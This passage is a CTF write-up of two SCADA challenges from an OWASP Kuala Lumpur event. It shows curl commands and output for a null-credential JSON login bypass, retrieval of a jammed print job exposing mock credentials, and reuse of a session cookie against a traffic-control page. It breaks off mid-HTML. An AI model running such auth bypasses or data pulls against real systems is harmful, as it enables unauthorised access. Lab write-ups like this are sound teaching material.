Team Project Sekai
by helyz

This is a CTF hosted by the **OWASP Kuala Lumpur Chapter**.

Week 5 - **Labyrinth** (Hardware, OS, ~~AI~~, Mobile)

Date: 19 - 21 June 2026

>> 🚩 **Flag Format:** `OWASPKL{...}`

# ISC

## SCADA

### PLUS - I

**Description**
Log in.
http://56.69.47.15:8081/

1. Given an SKTB Login Page (Integrated Traffic Control System)
    ![](Pasted%20image%2020260705015850.png)
2. The login page POSTs JSON credentials to `/api/login`. 
   By sending null for both fields, the Flask backend looses the type comparison which thinks that the password is correct regardless, granting us ez access.

3. Thus, flag can be obtained by just the curl command:
   
```bash
curl -X POST http://56.69.47.15:8081/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":null,"password":null}'
```
![](Pasted%20image%2020260705020312.png)

>> 🚩 Flag Found: OWASPKL{848f38080dc2682b154385d55b9bffe7}

### PLUS - II
 
 **Description**
I hate the car infront of me, plate VPS 4444, I hate traffic jam! I hate red! I hate everything! [http://56.69.47.15:8081/](http://56.69.47.15:8081/ "http://56.69.47.15:8081/")

1. Checked out port 80 with

```bash
curl -s "http://56.69.47.15:80/" --max-time 5
```

2. Resulted in an html response

```html
<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8"> <meta name="viewport" content="width=device-width"> <title>HP LaserJet P4015 - printer.jpim.gov.my</title> <style> * { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: Arial, Helvetica, sans-serif; font-size: 12px; background: #ffffff; color: #000000; } /* ── HP Blue top banner ── */ .hp-banner { background: #0096d6; height: 50px; display: flex; align-items: center; padding: 0 16px; justify-content: space-between; } .hp-logo { color: #ffffff; font-size: 26px; font-weight: bold; font-style: italic; font-family: "Times New Roman", serif; letter-spacing: -1px; } .hp-product-name { color: #ffffff; font-size: 13px; font-weight: bold; text-align: right; line-height: 1.4; } .hp-product-name span { display: block; font-size: 10px; font-weight: normal; color: #cce8f8; } /* ── Tab bar ── */ .tab-bar { background: #e8e8e8; border-bottom: 2px solid #0096d6; display: flex; padding: 0 0 0 12px; gap: 2px; align-items: flex-end; } .tab { padding: 6px 16px 5px; font-size: 11px; font-weight: bold; color: #333333; cursor: pointer; border: 1px solid #cccccc; border-bottom: none; background: #d4d4d4; text-decoration: none; display: block; margin-top: 4px; } .tab:hover { background: #e8e8e8; color: #0096d6; } .tab.active { background: #ffffff; color: #0096d6; border-color: #0096d6; border-bottom: 2px solid #ffffff; margin-bottom: -2px; padding-bottom: 7px; } /* ── Page layout ── */ .page-wrap { display: flex; min-height: calc(100vh - 102px); } /* ── Left nav ── */ .left-nav { width: 160px; flex-shrink: 0; background: #f0f0f0; border-right: 1px solid #cccccc; padding: 8px 0; } .nav-section-title { font-size: 10px; font-weight: bold; color: #ffffff; background: #0096d6; padding: 3px 10px; margin: 8px 0 2px; } .nav-item { display: block; padding: 4px 10px 4px 16px; font-size: 11px; color: #0000cc; text-decoration: none; cursor: pointer; border-left: 3px solid transparent; } .nav-item:hover { background: #ddeeff; } .nav-item.active { color: #000000; font-weight: bold; border-left: 3px solid #0096d6; background: #ffffff; text-decoration: none; } /* ── Main content ── */ .main-content { flex: 1; padding: 12px 16px; background: #ffffff; } .page-title { font-size: 14px; font-weight: bold; color: #0096d6; border-bottom: 1px solid #0096d6; padding-bottom: 4px; margin-bottom: 12px; } /* ── Status alert box ── */ .alert-box { border: 1px solid #cc0000; background: #fff5f5; padding: 8px 12px; margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px; } .alert-icon { font-size: 18px; flex-shrink: 0; line-height: 1; } .alert-text { font-size: 11px; color: #333; line-height: 1.6; } .alert-text strong { color: #cc0000; } /* ── Info tables ── */ .info-table { width: 100%; border-collapse: collapse; font-size: 11px; margin-bottom: 16px; } .info-table caption { text-align: left; font-size: 11px; font-weight: bold; color: #333333; background: #e0e8f0; padding: 4px 8px; border: 1px solid #aaaaaa; border-bottom: none; } .info-table th { background: #c8dae8; padding: 4px 10px; text-align: left; font-weight: bold; border: 1px solid #aaaaaa; width: 200px; color: #333333; } .info-table td { padding: 4px 10px; border: 1px solid #cccccc; color: #000000; background: #ffffff; } .info-table tr:nth-child(even) td { background: #f5f8fc; } /* ── Supplies bars ── */ .supply-bar-wrap { display: inline-block; width: 120px; height: 12px; background: #e0e0e0; border: 1px solid #aaaaaa; vertical-align: middle; margin-right: 6px; } .supply-bar { height: 100%; background: #0096d6; } .supply-bar.low { background: #cc0000; } .supply-bar.warn { background: #ff8800; } /* ── Jobs table ── */ .jobs-table { width: 100%; border-collapse: collapse; font-size: 11px; margin-bottom: 16px; } .jobs-table thead tr { background: #c8dae8; } .jobs-table th { padding: 5px 10px; text-align: left; font-weight: bold; border: 1px solid #aaaaaa; color: #333333; font-size: 10px; } .jobs-table td { padding: 5px 10px; border: 1px solid #cccccc; color: #000000; vertical-align: middle; } .jobs-table tr:hover td { background: #eef4ff; } .job-state-stopped { color: #cc0000; font-weight: bold; } .job-link { color: #0000cc; text-decoration: underline; cursor: pointer; font-size: 11px; } .job-link:hover { color: #0096d6; } /* ── Section header ── */ .section-hdr { font-size: 12px; font-weight: bold; color: #333333; background: #e0e8f0; border: 1px solid #aaaaaa; padding: 4px 8px; margin: 12px 0 0; } /* ── Footer ── */ .hp-footer { background: #f0f0f0; border-top: 1px solid #cccccc; padding: 6px 16px; font-size: 10px; color: #666666; display: flex; justify-content: space-between; } /* ── Tab content visibility ── */ .tab-content { display: none; } .tab-content.active { display: block; } /* ── Refresh note ── */ .refresh-note { font-size: 10px; color: #666666; margin-bottom: 10px; font-style: italic; } </style> </head> <body> <!-- HP Banner --> <div class="hp-banner"> <div class="hp-logo">hp</div> <div class="hp-product-name"> HP LaserJet P4015 <span>printer.jpim.gov.my &nbsp;|&nbsp; 192.168.10.52</span> </div> </div> <!-- Tab bar --> <div class="tab-bar"> <a class="tab active" onclick="switchTab('information')">Information</a> <a class="tab" onclick="switchTab('settings')">Settings</a> <a class="tab" onclick="switchTab('networking')">Networking</a> <a class="tab" onclick="switchTab('support')">HP Support</a> </div> <div class="page-wrap"> <!-- Left nav - changes with tab --> <div class="left-nav" id="leftNav"> <div class="nav-section-title">Information</div> <a class="nav-item active" onclick="switchPage('device-status')">Device Status</a> <a class="nav-item" onclick="switchPage('supplies-status')">Supplies Status</a> <a class="nav-item" onclick="switchPage('event-log')">Event Log</a> <a class="nav-item" onclick="switchPage('job-log')">Print Job Log</a> <a class="nav-item" onclick="switchPage('config-page')">Configuration Page</a> </div> <!-- Main content area --> <div class="main-content"> <!-- ── Device Status ── --> <div class="tab-content active" id="page-device-status"> <div class="page-title">Device Status</div> <p class="refresh-note">Last updated: <span id="lastUpdate">--</span> &nbsp;|&nbsp; Auto-refresh: off</p> <div class="alert-box"> <div class="alert-icon">⚠</div> <div class="alert-text"> <strong>Printer Stopped — Media Jam</strong><br> A paper jam has been detected in Tray 2 output path. Remove the jammed paper and press <strong>OK</strong> on the control panel to resume printing.<br> <strong>1 job</strong> is waiting in queue. </div> </div> <table class="info-table"> <caption>Printer Information</caption> <tr> <th>Model</th> <td>HP LaserJet P4015</td> </tr> <tr> <th>Serial Number</th> <td>CNJBK03456</td> </tr> <tr> <th>Firmware Version</th> <td>04.100.4</td> </tr> <tr> <th>Printer Status</th> <td><span style="color:#cc0000;font-weight:bold;">Stopped — Media Jam (Tray 2)</span></td> </tr> <tr> <th>IP Address</th> <td>192.168.10.52</td> </tr> <tr> <th>Hostname</th> <td>printer.jpim.gov.my</td> </tr> <tr> <th>Location</th> <td>Ibu Pejabat JPIM, Putrajaya — Level 3 Print Room</td> </tr> <tr> <th>Total Pages Printed</th> <td>48,291</td> </tr> <tr> <th>IPP Port</th> <td>631</td> </tr> </table> <table class="info-table"> <caption>Paper Trays</caption> <tr> <th>Tray 1 (Multipurpose)</th> <td>Empty</td> </tr> <tr> <th>Tray 2 (500-sheet)</th> <td><span style="color:#cc0000;font-weight:bold;">⚠ Media Jam — Clear paper path</span></td> </tr> <tr> <th>Tray 3 (500-sheet)</th> <td>250 sheets remaining — A4</td> </tr> <tr> <th>Output Bin</th> <td>Clear</td> </tr> </table> </div> <!-- ── Supplies Status ── --> <div class="tab-content" id="page-supplies-status"> <div class="page-title">Supplies Status</div> <table class="info-table"> <caption>Print Cartridges</caption> <tr> <th>Black (K) Toner</th> <td> <div class="supply-bar-wrap"> <div class="supply-bar low" style="width:12%"></div> </div> <span style="color:#cc0000;font-weight:bold;">12% — Order soon</span> </td> </tr> <tr> <th>Cyan (C) Toner</th> <td> <div class="supply-bar-wrap"> <div class="supply-bar" style="width:88%"></div> </div> 88% </td> </tr> <tr> <th>Magenta (M) Toner</th> <td> <div class="supply-bar-wrap"> <div class="supply-bar" style="width:91%"></div> </div> 91% </td> </tr> <tr> <th>Yellow (Y) Toner</th> <td> <div class="supply-bar-wrap"> <div class="supply-bar" style="width:84%"></div> </div> 84% </td> </tr> <tr> <th>Imaging Drum</th> <td>Replace at 2,400 pages</td> </tr> <tr> <th>Fuser Kit</th> <td>OK — 42,300 / 200,000 pages</td> </tr> <tr> <th>Transfer Kit</th> <td>OK — 42,300 / 100,000 pages</td> </tr> </table> </div> <!-- ── Event Log ── --> <div class="tab-content" id="page-event-log"> <div class="page-title">Event Log</div> <table class="jobs-table"> <thead> <tr> <th>No.</th> <th>Date / Time</th> <th>Event</th> <th>Code</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>2011-03-14 09:23:04</td> <td style="color:#cc0000">Media jam — Tray 2 output path</td> <td>13.0000</td> </tr> <tr> <td>2</td> <td>2011-03-14 09:22:58</td> <td>Print job received — Job #3</td> <td>—</td> </tr> <tr> <td>3</td> <td>2011-03-14 09:22:11</td> <td>Job #3 spooled successfully</td> <td>—</td> </tr> <tr> <td>4</td> <td>2011-03-13 17:45:02</td> <td>Job #2 printed — 4 pages</td> <td>—</td> </tr> <tr> <td>5</td> <td>2011-03-13 17:44:11</td> <td>Job #2 received</td> <td>—</td> </tr> <tr> <td>6</td> <td>2011-03-13 11:02:33</td> <td>Job #1 printed — 1 page</td> <td>—</td> </tr> <tr> <td>7</td> <td>2011-03-13 08:30:00</td> <td>Printer power on — ready</td> <td>—</td> </tr> <tr> <td>8</td> <td>2011-03-07 16:12:44</td> <td>Black toner low warning (below 20%)</td> <td>10.0003</td> </tr> </tbody> </table> </div> <!-- ── Print Job Log ── --> <div class="tab-content" id="page-job-log"> <div class="page-title">Print Job Log</div> <p class="refresh-note">Showing active and recently completed jobs.</p> <div class="alert-box"> <div class="alert-icon">ℹ</div> <div class="alert-text"> Job #3 is currently <strong>stopped</strong> due to a media jam. The job data remains spooled and can be retrieved via <strong>IPP (port 631)</strong> or directly at <a href="/jobs/3/document" style="color:#0000cc;">/jobs/3/document</a>. </div> </div> <table class="jobs-table"> <thead> <tr> <th>Job ID</th> <th>Document Name</th> <th>Submitted By</th> <th>Date / Time</th> <th>Pages</th> <th>Size</th> <th>State</th> <th>Action</th> </tr> </thead> <tbody id="jobTableBody"> <!-- Populated by JS --> </tbody> </table> <table class="jobs-table"> <thead> <tr> <th colspan="8">Completed Jobs (Recent)</th> </tr> <tr> <th>Job ID</th> <th>Document Name</th> <th>Submitted By</th> <th>Date / Time</th> <th>Pages</th> <th>Size</th> <th>State</th> <th></th> </tr> </thead> <tbody> <tr> <td>2</td> <td>Laporan Prestasi Bulanan Mac 2011.pdf</td> <td>zulkifli.mahamud</td> <td>2011-03-13 17:44:11</td> <td>4</td> <td>218 KB</td> <td style="color:#006600;">Completed</td> <td>—</td> </tr> <tr> <td>1</td> <td>Jadual Mesyuarat Suku Pertama.doc</td> <td>noraziah.bt.hassan</td> <td>2011-03-13 11:02:33</td> <td>1</td> <td>44 KB</td> <td style="color:#006600;">Completed</td> <td>—</td> </tr> </tbody> </table> </div> <!-- ── Configuration Page ── --> <div class="tab-content" id="page-config-page"> <div class="page-title">Configuration Page</div> <table class="info-table"> <caption>Device Information</caption> <tr> <th>Product Name</th> <td>HP LaserJet P4015</td> </tr> <tr> <th>Serial Number</th> <td>CNJBK03456</td> </tr> <tr> <th>Service ID</th> <td>28274</td> </tr> <tr> <th>Firmware Datecode</th> <td>20110201</td> </tr> <tr> <th>Firmware Version</th> <td>04.100.4</td> </tr> <tr> <th>Installed Memory</th> <td>512 MB</td> </tr> <tr> <th>Page Count</th> <td>48,291</td> </tr> </table> <table class="info-table"> <caption>Network Settings</caption> <tr> <th>IP Address (IPv4)</th> <td>192.168.10.52</td> </tr> <tr> <th>Subnet Mask</th> <td>255.255.255.0</td> </tr> <tr> <th>Default Gateway</th> <td>192.168.10.1</td> </tr> <tr> <th>Hostname</th> <td>printer.jpim.gov.my</td> </tr> <tr> <th>MAC Address</th> <td>00:1B:78:4A:2C:F1</td> </tr> <tr> <th>IPP</th> <td>Enabled — port 631</td> </tr> <tr> <th>Raw Printing (Port 9100)</th> <td>Enabled</td> </tr> <tr> <th>SNMP</th> <td>Enabled — community: public</td> </tr> </table> </div> <!-- ── Settings tab (placeholder) ── --> <div class="tab-content" id="page-settings"> <div class="page-title">Device Settings</div> <div class="alert-box"> <div class="alert-icon">🔒</div> <div class="alert-text"> <strong>Administrator password required.</strong><br> To change device settings, please enter the administrator password. </div> </div> </div> <!-- ── Networking tab ── --> <div class="tab-content" id="page-networking"> <div class="page-title">Network Summary</div> <table class="info-table"> <caption>TCP/IP Settings</caption> <tr> <th>IP Address</th> <td>192.168.10.52</td> </tr> <tr> <th>Configuration Method</th> <td>Manual</td> </tr> <tr> <th>DNS Server</th> <td>192.168.10.1</td> </tr> <tr> <th>Domain Name</th> <td>jpim.gov.my</td> </tr> <tr> <th>IPP Printing</th> <td>Enabled — <strong>ipp://printer.jpim.gov.my:631/printers/LaserJet-P4015</strong></td> </tr> <tr> <th>Raw Printing</th> <td>Enabled — port 9100</td> </tr> <tr> <th>SNMP Community</th> <td>public</td> </tr> </table> </div> </div><!-- end main-content --> </div><!-- end page-wrap --> <div class="hp-footer"> <span>HP LaserJet P4015 &nbsp;|&nbsp; Firmware 04.100.4 &nbsp;|&nbsp; &copy; 2009 Hewlett-Packard Development Company, L.P.</span> <span>192.168.10.52 &nbsp;|&nbsp; printer.jpim.gov.my</span> </div> <script> let currentTab = 'information'; let currentPage = 'device-status'; function switchTab(tab) { currentTab = tab; document.querySelectorAll('.tab').forEach(t => t.classList.remove('active')); event.target.classList.add('active'); // Update left nav based on tab const nav = document.getElementById('leftNav'); if (tab === 'information') { nav.innerHTML = ` <div class="nav-section-title">Information</div> <a class="nav-item" onclick="switchPage('device-status')">Device Status</a> <a class="nav-item" onclick="switchPage('supplies-status')">Supplies Status</a> <a class="nav-item" onclick="switchPage('event-log')">Event Log</a> <a class="nav-item" onclick="switchPage('job-log')">Print Job Log</a> <a class="nav-item" onclick="switchPage('config-page')">Configuration Page</a> `; switchPage('device-status'); } else if (tab === 'settings') { nav.innerHTML = ` <div class="nav-section-title">Settings</div> <a class="nav-item" onclick="switchPage('settings')">Device Settings</a> `; switchPage('settings'); } else if (tab === 'networking') { nav.innerHTML = ` <div class="nav-section-title">Networking</div> <a class="nav-item" onclick="switchPage('networking')">Network Summary</a> `; switchPage('networking'); } } function switchPage(page) { currentPage = page; document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active')); const el = document.getElementById('page-' + page); if (el) el.classList.add('active'); document.querySelectorAll('.nav-item').forEach(n => { n.classList.remove('active'); if (n.getAttribute('onclick') && n.getAttribute('onclick').includes(page)) { n.classList.add('active'); } }); } // Populate job table from API async function loadJobs() { try { const res = await fetch('/jobs'); const jobs = await res.json(); const tbody = document.getElementById('jobTableBody'); if (!tbody) return; tbody.innerHTML = ''; jobs.forEach(j => { const tr = document.createElement('tr'); tr.innerHTML = ` <td>${j.id}</td> <td>${j.name}</td> <td>${j.user}</td> <td>${j.submitted}</td> <td>1</td> <td>${j.size_kb} KB</td> <td class="job-state-stopped">⚠ ${j.state_message}</td> <td><a class="job-link" href="/jobs/${j.id}/document">Retrieve document</a></td> `; tbody.appendChild(tr); }); } catch (e) { } } // Update clock function updateTime() { const el = document.getElementById('lastUpdate'); if (el) el.textContent = new Date().toLocaleTimeString(); } updateTime(); setInterval(updateTime, 30000); loadJobs(); </script> </body>
```

3. The `<title>` header mentioned that its a printer page, most likely a fake one.

```html
<title>HP LaserJet P4015 - printer.jpim.gov.my</title>
```

4. Found a clue in the **Print Job Log** section. Mentions that

```html
<!-- ── Print Job Log ── --> <div class="tab-content" id="page-job-log"> <div class="page-title">Print Job Log</div> <p class="refresh-note">Showing active and recently completed jobs.</p> <div class="alert-box"> <div class="alert-icon">ℹ</div> <div class="alert-text"> Job #3 is currently <strong>stopped</strong> due to a media jam. The job data remains spooled and can be retrieved via <strong>IPP (port 631)</strong> or directly at <a href="/jobs/3/document" style="color:#0000cc;">/jobs/3/document</a>. </div> </div> <table class="jobs-table"> <thead> <tr> <th>Job ID</th> <th>Document Name</th> <th>Submitted By</th> <th>Date / Time</th> <th>Pages</th> <th>Size</th> <th>State</th> <th>Action</th> </tr> </thead> <tbody id="jobTableBody">
```

specifically;

```html
Job #3 is stopped due to media jam. The job data can be retrieved at /jobs/3/document. 
```

5. Theres a jammed job at `/jobs/3/document`, heres the deets that I found. By curl, this returns a classified government memo containing system credentials:

```bash
curl -sv "http://56.69.47.15:80/jobs/3/document"
```

Output:

```bash
*   Trying 56.69.47.15:80...
* Established connection to 56.69.47.15 (56.69.47.15 port 80) from 192.168.0.105 port 51346 
* using HTTP/1.x
> GET /jobs/3/document HTTP/1.1
> Host: 56.69.47.15
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Werkzeug/3.1.8 Python/3.11.15
< Date: Sat, 20 Jun 2026 08:18:11 GMT
< Content-Disposition: attachment; filename="PEKELILING-DALAMAN-3-2011.ps"
< X-Printer-Job-State: stopped
< X-Printer-Job-Name: PEKELILING DALAMAN BIL. 3-2011 - SULIT.ps
< Content-Type: application/postscript
< Content-Length: 2859
< Connection: close
< 
%!PS-Adobe-3.0
%%Title: PEKELILING DALAMAN - SULIT
%%Creator: Microsoft Word 2003
%%CreationDate: Mon Mar 14 09:22:11 2011
%%For: Pn. Halimah bt. Zainudin
%%Pages: 1
%%DocumentFonts: Times-Roman Times-Bold Helvetica
%%EndComments

%%BeginProlog
/inch { 72 mul } def
%%EndProlog

%%Page: 1 1

% --- Page setup ---
/Times-Bold findfont 14 scalefont setfont

% Header
72 750 moveto
(JABATAN PENGURUSAN INFRASTRUKTUR MALAYSIA) show

/Times-Roman findfont 10 scalefont setfont
72 735 moveto
(Ibu Pejabat, Persiaran Perdana, 62100 Putrajaya) show

72 720 moveto
(Tel: 03-8888 1200   Faks: 03-8888 1201) show

% Divider line
72 710 moveto 540 710 lineto stroke

% Reference
/Times-Bold findfont 10 scalefont setfont
72 695 moveto
(Ruj. Kami: JPIM.BPT(S)560/3/2/1 Jld.4\(11\)) show

/Times-Roman findfont 10 scalefont setfont
72 680 moveto
(Tarikh: 14 Mac 2011) show

% Classification
/Times-Bold findfont 12 scalefont setfont
200 660 moveto
(** SULIT **) show

% Title
/Times-Bold findfont 11 scalefont setfont
72 640 moveto
(PEKELILING DALAMAN BIL. 3/2011) show

72 625 moveto
(PROSEDUR KESELAMATAN SISTEM PENGURUSAN INFRASTRUKTUR \(SPI\)) show

% Body
/Times-Roman findfont 10 scalefont setfont

72 600 moveto
(1.  TUJUAN) show

72 585 moveto
(    Pekeliling ini bertujuan untuk memaklumkan semua kakitangan berkenaan) show
72 572 moveto
(    prosedur keselamatan terbaru bagi sistem SPI yang telah dikemaskini.) show

72 552 moveto
(2.  LATAR BELAKANG) show

72 537 moveto
(    Susulan audit keselamatan IT yang dijalankan pada Februari 2011, beberapa) show
72 524 moveto
(    kelemahan telah dikenal pasti dalam sistem kawalan trafik sedia ada.) show

72 504 moveto
(3.  BUTIRAN AKSES SISTEM \(RAHSIA - UNTUK KEGUNAAN DALAMAN SAHAJA\)) show

72 489 moveto
(    Bagi membolehkan unit teknikal menjalankan kerja-kerja penyelenggaraan,) show
72 476 moveto
(    butiran berikut hendaklah disimpan dengan selamat dan tidak didedahkan) show
72 463 moveto
(    kepada mana-mana pihak yang tidak berkenaan:) show

72 443 moveto
(    Kata Akses Sistem  :  OWASPKL{dd1cd3a6318bb67f6d11489e362df54e}) show

72 430 moveto
(    ID Pengguna        :  sysadmin) show

72 417 moveto
(    Pelayan            :  192.168.10.5) show

72 397 moveto
(4.  TINDAKAN) show

72 382 moveto
(    Semua Ketua Bahagian dikehendaki memastikan pekeliling ini disebarkan) show
72 369 moveto
(    kepada kakitangan berkenaan sahaja. Sila musnahkan salinan ini selepas) show
72 356 moveto
(    dibaca.) show

72 336 moveto
(    Sekian, terima kasih.) show

72 300 moveto
(    ...........................................) show
72 288 moveto
(    \(DATO\' HJ. ZULKIFLI BIN MAHAMUD\)) show
72 276 moveto
(    Ketua Pengarah) show
72 264 moveto
(    Jabatan Pengurusan Infrastruktur Malaysia) show

% Footer
72 80 moveto
(** SULIT - DOKUMEN INI ADALAH HARTA KERAJAAN MALAYSIA **) show

showpage
%%EOF
* shutting down connection #0
```

6. Logged into SKTB again with a captured cookie session 
   ![](Pasted%20image%2020260709213630.png)

7. Inspected SCADA page and *coil state* with my cookies that are currently itchy rn

```bash
curl -s "http://56.69.47.15:8081/scada.html" -b /tmp/sktb_cookies.txt
```

8. Returned

```html
<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>SISTEM KAWALAN TRAFIK - JABATAN PENGURUSAN INFRASTRUKTUR</title> <style> body { background: #c0c0c0; font-family: "Times New Roman", Times, serif; font-size: 12px; margin: 0; padding: 0; color: #000080; } /* Old-school marquee bar */ .marquee-bar { background: #000080; color: #ffff00; font-size: 11px; padding: 2px 0; font-family: Arial, sans-serif; font-weight: bold; overflow: hidden; white-space: nowrap; } .marquee-inner { display: inline-block; animation: marquee 25s linear infinite; padding-left: 100%; } @keyframes marquee { from { transform: translateX(0); } to { transform: translateX(-100%); } } /* Header */ .header { background: linear-gradient(180deg, #000080 0%, #0000aa 40%, #1a1a8c 100%); padding: 8px 12px; border-bottom: 3px solid #ffcc00; display: flex; align-items: center; justify-content: space-between; } .header-title { color: #ffffff; font-family: Arial, sans-serif; font-weight: bold; } .header-title .main { font-size: 16px; letter-spacing: 1px; } .header-title .sub { font-size: 10px; color: #aaaaff; margin-top: 2px; } .header-right { text-align: right; font-family: "Courier New", monospace; font-size: 11px; color: #ffff99; } .blink { animation: blink 1s step-end infinite; } @keyframes blink { 50% { opacity: 0; } } /* Nav bar */ .navbar { background: #d4d0c8; border-bottom: 2px solid #808080; border-top: 2px solid #ffffff; padding: 3px 8px; display: flex; align-items: center; gap: 2px; } .navbar a { background: #d4d0c8; border-top: 2px solid #ffffff; border-left: 2px solid #ffffff; border-right: 2px solid #404040; border-bottom: 2px solid #404040; padding: 2px 10px; font-size: 11px; font-family: Arial, sans-serif; color: #000000; text-decoration: none; cursor: pointer; } .navbar a:hover { background: #e8e4dc; } .navbar a.active { background: #c0c0c0; border-top: 2px solid #404040; border-left: 2px solid #404040; border-right: 2px solid #ffffff; border-bottom: 2px solid #ffffff; } .navbar-right { margin-left: auto; font-family: "Courier New", monospace; font-size: 10px; color: #000080; display: flex; align-items: center; gap: 12px; } .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #00cc00; box-shadow: 0 0 4px #00cc00; animation: blink 1.5s step-end infinite; } /* Main layout */ .layout { display: flex; height: calc(100vh - 110px); overflow: hidden; } /* Sidebar */ .sidebar { width: 210px; flex-shrink: 0; background: #d4d0c8; border-right: 2px solid #808080; overflow-y: auto; font-family: Arial, sans-serif; } .sidebar-panel { margin: 6px; border-top: 2px solid #ffffff; border-left: 2px solid #ffffff; border-right: 2px solid #404040; border-bottom: 2px solid #404040; background: #d4d0c8; } .sidebar-panel-title { background: #000080; color: #ffffff; font-size: 10px; font-weight: bold; padding: 2px 6px; font-family: Arial, sans-serif; letter-spacing: 1px; } .sidebar-panel-body { padding: 6px; } .coil-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px; font-size: 10px; font-family: "Courier New", monospace; border-bottom: 1px dotted #aaaaaa; padding-bottom: 2px; } .coil-label { color: #000080; } .coil-val { font-size: 9px; padding: 1px 4px; border: 1px inset #808080; background: #ffffff; min-width: 36px; text-align: center; font-weight: bold; } .coil-val.on { color: #006600; background: #ccffcc; } .coil-val.off { color: #880000; background: #ffcccc; } .info-block { font-size: 10px; font-family: "Courier New", monospace; color: #000080; line-height: 1.7; } .info-block .lbl { color: #333333; } .info-block .val { color: #cc0000; font-weight: bold; } .status-text { font-size: 10px; font-family: Arial, sans-serif; color: #000080; padding: 4px; background: #fffff0; border: 1px inset #808080; min-height: 28px; } /* Canvas */ .canvas { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: #c0c0c0; } /* Scene */ .scene { flex: 0 0 240px; height: 240px; position: relative; overflow: hidden; background: #87ceeb; border-bottom: 2px solid #808080; } /* Sky */ .scene::before { content: ''; position: absolute; inset: 0; background: linear-gradient(180deg, #87ceeb 0%, #b0d8f0 70%, #c8e8f8 100%); } /* Road */ .road { position: absolute; bottom: 0; left: 0; right: 0; height: 100px; background: #555555; border-top: 3px solid #ffcc00; } .road-line { position: absolute; top: 46px; left: 0; right: 0; height: 5px; background: repeating-linear-gradient(90deg, #ffffff 0px, #ffffff 30px, transparent 30px, transparent 60px); } .road-shoulder { position: absolute; bottom: 0; left: 0; right: 0; height: 8px; background: #888888; border-top: 1px solid #aaaaaa; } /* Traffic lights */ .tl-group { position: absolute; bottom: 98px; display: flex; flex-direction: column; align-items: center; } #tl-group-0 { left: 15%; } #tl-group-1 { left: calc(50% - 18px); } #tl-group-2 { right: 15%; } .tl-id { font-size: 8px; font-family: Arial, sans-serif; color: #000066; font-weight: bold; margin-bottom: 3px; background: #ffff99; padding: 0 3px; border: 1px solid #cccc00; } .tl-housing { width: 34px; background: #222222; border: 3px solid #111111; border-radius: 3px; padding: 5px 4px; display: flex; flex-direction: column; gap: 4px; box-shadow: 2px 2px 0 #000000; } .bulb { width: 20px; height: 20px; border-radius: 50%; margin: 0 auto; border: 2px solid #000000; background: #333333; transition: background 0.15s; } .bulb.red.on { background: #ff2222; box-shadow: 0 0 10px #ff0000; } .bulb.yel.on { background: #ffcc00; box-shadow: 0 0 10px #ffcc00; } .bulb.grn.on { background: #00ee44; box-shadow: 0 0 10px #00cc44; } .tl-pole { width: 5px; height: 55px; background: linear-gradient(90deg, #888 0%, #ccc 40%, #888 100%); margin: 0 auto; border-left: 1px solid #555; border-right: 1px solid #aaa; } .tl-base { width: 18px; height: 6px; background: #888888; margin: 0 auto; border-top: 1px solid #aaaaaa; border-left: 1px solid #aaaaaa; border-right: 1px solid #555555; border-bottom: 1px solid #555555; } /* Car */ .car { position: absolute; bottom: 103px; left: -110px; width: 80px; height: 40px; transition: left 4s linear; z-index: 10; } .car.driving { left: calc(100% + 110px); } .car svg { width: 100%; height: 100%; } /* Info bar */ .info-bar { background: #d4d0c8; border-bottom: 2px solid #808080; border-top: 2px solid #ffffff; padding: 4px 10px; display: flex; gap: 24px; flex-shrink: 0; font-family: "Courier New", monospace; } .info-item { font-size: 10px; color: #000080; } .info-item span { color: #cc0000; font-weight: bold; display: block; } /* Coil table area */ .coil-table-wrap { flex: 1; overflow-y: auto; background: #ffffff; border-top: 2px inset #808080; padding: 8px 12px; min-height: 0; } .table-title { font-family: Arial, sans-serif; font-size: 11px; font-weight: bold; color: #000080; margin-bottom: 6px; padding-bottom: 3px; border-bottom: 2px solid #000080; text-transform: uppercase; letter-spacing: 1px; } .coil-table { width: 100%; border-collapse: collapse; font-size: 11px; font-family: Arial, sans-serif; } .coil-table th { background: #000080; color: #ffffff; padding: 3px 8px; text-align: left; font-size: 10px; font-weight: bold; letter-spacing: 1px; border: 1px solid #000044; } .coil-table tr:nth-child(even) { background: #e8e8ff; } .coil-table tr:nth-child(odd) { background: #ffffff; } .coil-table td { padding: 3px 8px; color: #000000; border: 1px solid #cccccc; font-family: "Courier New", monospace; font-size: 10px; } .coil-table .val-on { color: #006600; font-weight: bold; } .coil-table .val-off { color: #888888; } .coil-table .val-red { color: #cc0000; font-weight: bold; } .coil-table .val-yel { color: #886600; font-weight: bold; } /* Win overlay */ .win-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); z-index: 300; align-items: center; justify-content: center; } .win-overlay.show { display: flex; } .win-box { background: #d4d0c8; border-top: 3px solid #ffffff; border-left: 3px solid #ffffff; border-right: 3px solid #404040; border-bottom: 3px solid #404040; width: 480px; font-family: Arial, sans-serif; } .win-titlebar { background: #000080; color: #ffffff; padding: 4px 8px; font-size: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; } .win-titlebar .close-btn { background: #d4d0c8; border-top: 2px solid #ffffff; border-left: 2px solid #ffffff; border-right: 2px solid #404040; border-bottom: 2px solid #404040; width: 16px; height: 14px; font-size: 10px; font-weight: bold; text-align: center; color: #000000; cursor: default; line-height: 12px; } .win-body { padding: 16px 20px; text-align: center; } .win-icon { font-size: 32px; margin-bottom: 8px; } .win-msg { font-size: 12px; color: #000080; font-weight: bold; margin-bottom: 12px; } .win-flag { background: #ffffff; border: 2px inset #808080; padding: 8px 12px; font-family: "Courier New", monospace; font-size: 14px; color: #006600; font-weight: bold; word-break: break-all; margin-bottom: 12px; } .win-ok-btn { background: #d4d0c8; border-top: 2px solid #ffffff; border-left: 2px solid #ffffff; border-right: 2px solid #404040; border-bottom: 2px solid 